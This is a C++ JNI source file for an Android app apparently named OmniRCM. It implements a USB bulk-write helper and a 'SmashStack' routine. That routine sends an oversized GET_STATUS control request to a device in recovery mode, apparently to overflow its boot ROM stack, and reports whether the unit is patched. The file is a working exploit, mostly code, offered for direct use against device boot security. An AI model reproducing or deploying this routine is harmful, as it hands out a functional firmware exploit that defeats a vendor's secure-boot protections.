#include <jni.h>
#include <cerrno>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/usbdevice_fs.h>
#include <linux/usb/ch9.h>
#include <android/log.h>

#define TAG "OmniRCM"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,  TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__)

#define SMASH_LEN       0x7000
#define CTRL_SIZE       8
#define SLEEP_250MS     250000
#define SLEEP_40MS      40000

#define EAGAIN_VAL      11
#define ENOENT_VAL      2
#define ENODEV_VAL      19
#define EPIPE_VAL       32
#define EREMOTEIO_VAL   121
#define ECONNRESET_VAL  104

#define RESULT_SUCCESS    0
#define RESULT_PATCHED_V1 1
#define RESULT_TIMED_OUT  2
#define RESULT_ERROR     -1

#define SUBMITURB_CODE     0x8038550AUL
#define DISCARDURB_CODE    0x0000550BUL
#define REAPURBNDELAY_CODE 0x4008550DUL

extern "C" JNIEXPORT jint JNICALL
Java_io_github_omnircm_rcm_RcmInjector_nativeWriteBulk(
        JNIEnv *env,
        jobject,
        jint fd,
        jint epAddress,
        jbyteArray data,
        jint length,
        jint timeoutMs)
{
    jbyte *buf = env->GetByteArrayElements(data, nullptr);
    if (!buf) return -ENOMEM;

    struct usbdevfs_bulktransfer bulk;
    memset(&bulk, 0, sizeof(bulk));
    bulk.ep      = (unsigned int) epAddress;
    bulk.len     = (unsigned int) length;
    bulk.timeout = (unsigned int) timeoutMs;
    bulk.data    = buf;

    int rc = ioctl(fd, USBDEVFS_BULK, &bulk);
    int err = errno;

    env->ReleaseByteArrayElements(data, buf, JNI_ABORT);

    if (rc >= 0) {
        LOGI("WriteBulk: ep=0x%02x rc=%d (expected %d)", epAddress, rc, length);
        return rc;
    }

    LOGI("WriteBulk: failed ep=0x%02x rc=%d errno=%d", epAddress, rc, err);
    return -err;
}

extern "C" JNIEXPORT jint JNICALL
Java_io_github_omnircm_rcm_RcmInjector_nativeSmashStack(
        JNIEnv *,
        jobject,
        jint fd,
        jint)
{
    int total_buf_len = CTRL_SIZE + SMASH_LEN;

    void *data_buf = calloc(1, total_buf_len);
    if (!data_buf) return RESULT_ERROR;

    struct usbdevfs_urb *urb = (struct usbdevfs_urb *) calloc(1, sizeof(struct usbdevfs_urb));
    if (!urb) { free(data_buf); return RESULT_ERROR; }

    struct usbdevfs_urb **reap_buf = (struct usbdevfs_urb **) calloc(1, sizeof(void *));
    if (!reap_buf) { free(data_buf); free(urb); return RESULT_ERROR; }

    uint8_t *ctrl = (uint8_t *) data_buf;
    ctrl[0] = USB_DIR_IN | USB_RECIP_INTERFACE;
    ctrl[1] = USB_REQ_GET_STATUS;
    ctrl[2] = 0; ctrl[3] = 0;
    ctrl[4] = 0; ctrl[5] = 0;
    ctrl[6] = (uint8_t)(SMASH_LEN & 0xFF);
    ctrl[7] = (uint8_t)((SMASH_LEN >> 8) & 0xFF);

    urb->type          = USBDEVFS_URB_TYPE_CONTROL;
    urb->endpoint      = USB_DIR_IN;
    urb->flags         = USBDEVFS_URB_SHORT_NOT_OK;
    urb->buffer        = data_buf;
    urb->buffer_length = total_buf_len;

    int result = RESULT_ERROR;

    int rc = ioctl(fd, SUBMITURB_CODE, urb);
    if (rc != 0) {
        LOGE("Smash: SUBMITURB ioctl failed (rc=%d errno=%d)", rc, errno);
        goto cleanup;
    }

    usleep(SLEEP_250MS);

    rc = ioctl(fd, REAPURBNDELAY_CODE, reap_buf);
    if (rc < 0) {
        int err = errno;
        if (err == EAGAIN_VAL) {
            int discard_rc = ioctl(fd, DISCARDURB_CODE, urb);
            if (discard_rc != 0)
                LOGE("Smash: DISCARDURB ioctl failed (rc=%d errno=%d)", discard_rc, errno);

            usleep(SLEEP_40MS);

            rc = ioctl(fd, REAPURBNDELAY_CODE, reap_buf);
            if (rc < 0) {
                int err2 = errno;
                if (err2 == ENODEV_VAL) {
                    result = RESULT_TIMED_OUT;
                } else {
                    LOGE("Smash: URB still pending after discard (errno=%d)", err2);
                    result = RESULT_ERROR;
                }
                goto cleanup;
            }

            int status2  = urb->status;
            int act_len2 = urb->actual_length;
            LOGI("Smash: post discard status=%d actualLen=%d", status2, act_len2);

            if (status2 == 0 && act_len2 == 2)         { result = RESULT_PATCHED_V1; goto cleanup; }
            if (status2 == -EPIPE_VAL)                  { result = RESULT_PATCHED_V1; goto cleanup; }
            if (status2 == -EREMOTEIO_VAL)              { result = RESULT_PATCHED_V1; goto cleanup; }
            if (status2 == -ECONNRESET_VAL ||
                status2 == -ENOENT_VAL)                 { result = RESULT_SUCCESS;    goto cleanup; }

            LOGE("Smash: unrecognized post discard status=%d actualLen=%d", status2, act_len2);
            result = RESULT_ERROR;
            goto cleanup;

        } else if (err == ENODEV_VAL) {
            result = RESULT_TIMED_OUT;
            goto cleanup;
        } else {
            LOGE("Smash: unexpected REAPURBNDELAY result (rc=%d errno=%d)", rc, err);
            result = RESULT_ERROR;
            goto cleanup;
        }
    } else {
        int status  = urb->status;
        int act_len = urb->actual_length;
        LOGI("Smash: fast path status=%d actualLen=%d", status, act_len);

        if (status == 0 && act_len == 2)  { result = RESULT_PATCHED_V1; goto cleanup; }
        if (status == -EPIPE_VAL)         { result = RESULT_PATCHED_V1; goto cleanup; }
        if (status == -EREMOTEIO_VAL)     { result = RESULT_PATCHED_V1; goto cleanup; }

        result = RESULT_SUCCESS;
    }

cleanup:
    free(data_buf);
    free(urb);
    free(reap_buf);
    return result;
}
